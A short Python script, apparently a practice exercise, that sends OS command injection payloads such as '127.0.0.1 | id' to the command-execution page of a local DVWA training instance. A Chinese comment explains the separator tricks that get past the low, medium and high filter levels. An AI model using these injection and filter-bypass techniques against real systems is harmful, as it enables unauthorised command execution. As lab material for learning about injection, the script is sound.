from dvwa import DVWA, pre_blocks

SECURITY = "medium"
HOST = "127.0.0.1"
COMMANDS = ["id", "whoami", "ls /"]
SEPARATORS = {"low": ";", "medium": " | ", "high": "|"}
"""
Low: 直接拼接, 用 ; 连接命令
Medium: 过滤 && 和 ;, 改用 |
High: 过滤 & ; |加空格 - $ ( ) ` 和 ||, 用 |id 这种不带空格的写法
"""

target = DVWA("exec", SECURITY)
separator = SEPARATORS[SECURITY]

for command in COMMANDS:
    payload = f"{HOST}{separator}{command}"
    response = target.post(
        "",
        data={"ip": payload, "Submit": "Submit"},
    )
    blocks = pre_blocks(response.text)
    print(f"\n=== {command} ===")
    print(f"Payload: {payload}")
    print(blocks[-1] if blocks else "No output.")
